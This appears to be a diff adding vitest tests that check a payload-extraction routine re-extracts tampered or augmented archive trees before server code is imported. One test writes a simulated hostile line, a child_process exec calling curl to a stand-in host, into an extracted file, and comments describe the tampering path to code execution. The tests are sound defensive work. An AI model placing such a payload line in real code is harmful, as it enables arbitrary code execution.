@@ -1,7 +1,9 @@
 import { describe, it, expect } from 'vitest';
 import { Hono } from 'hono';
 import { createHash, type KeyObject } from 'node:crypto';
-import { existsSync, mkdtempSync, readdirSync, readFileSync, writeFileSync } from 'node:fs';
+import {
+  existsSync, mkdtempSync, readdirSync, readFileSync, statSync, writeFileSync,
+} from 'node:fs';
 import { tmpdir } from 'node:os';
 import path from 'node:path';
 import JSZip from 'jszip';
@@ -336,5 +338,60 @@ describe('extractVerifiedPayload — re-verifies bytes read after verification',
       ? readdirSync(path.join(root, 'extracted'))
       : [];
     expect(leftovers).toEqual([]);
+  });
+
+  // The reuse shortcut was the ONLY unverified path into `import()`. The archive
+  // is re-verified on every boot, so an attacker with write access to the
+  // artifact-store volume does the strictly easier thing: skip the archive and
+  // overwrite `extracted/sha256-<hex>/<entry>` directly. The `.verified` marker
+  // then short-circuits extraction and `loadServerEntry` imports the tampered
+  // file with no hash ever computed — same arbitrary-code-execution outcome.
+  it('re-extracts instead of reusing an extracted tree whose bytes were tampered with on disk', async () => {
+    const { archivePath, files, root } = await writeArchive(MEMBERS);
+    const bundle = bundleOf(archivePath, files);
+
+    const dest = await extractVerifiedPayload(bundle, root);
+    expect(existsSync(path.join(dest, '.verified'))).toBe(true);
+
+    // Tamper post-extraction, leaving the `.verified` marker in place.
+    const entryPath = path.join(dest, 'server/index.js');
+    writeFileSync(entryPath, 'require("child_process").exec("curl evil.example");');
+
+    const reused = await extractVerifiedPayload(bundle, root);
+
+    expect(reused).toBe(dest);
+    // The tampered bytes are gone: what a subsequent loadServerEntry would read
+    // is the verified content from the signed archive.
+    expect(readFileSync(entryPath, 'utf8')).toBe(MEMBERS['server/index.js']);
+    expect(existsSync(path.join(dest, '.verified'))).toBe(true);
+  });
+
+  // A verified member may `require()` a sibling, so a file that is not in the
+  // signed inventory is reachable code even though no member's hash changed.
+  it('re-extracts when an extra file appears in a previously verified tree', async () => {
+    const { archivePath, files, root } = await writeArchive(MEMBERS);
+    const bundle = bundleOf(archivePath, files);
+
+    const dest = await extractVerifiedPayload(bundle, root);
+    const smuggled = path.join(dest, 'server/evil.js');
+    writeFileSync(smuggled, 'module.exports = 1;');
+
+    await extractVerifiedPayload(bundle, root);
+
+    expect(existsSync(smuggled)).toBe(false);
+    expect(readFileSync(path.join(dest, 'server/index.js'), 'utf8'))
+      .toBe(MEMBERS['server/index.js']);
+  });
+
+  it('reuses an untampered verified tree without rewriting it', async () => {
+    const { archivePath, files, root } = await writeArchive(MEMBERS);
+    const bundle = bundleOf(archivePath, files);
+
+    const dest = await extractVerifiedPayload(bundle, root);
+    const before = statSync(path.join(dest, 'server/index.js')).ino;
+
+    expect(await extractVerifiedPayload(bundle, root)).toBe(dest);
+    // Same inode ⇒ the happy path did not re-extract and rename a fresh tree.
+    expect(statSync(path.join(dest, 'server/index.js')).ino).toBe(before);
   });
 });
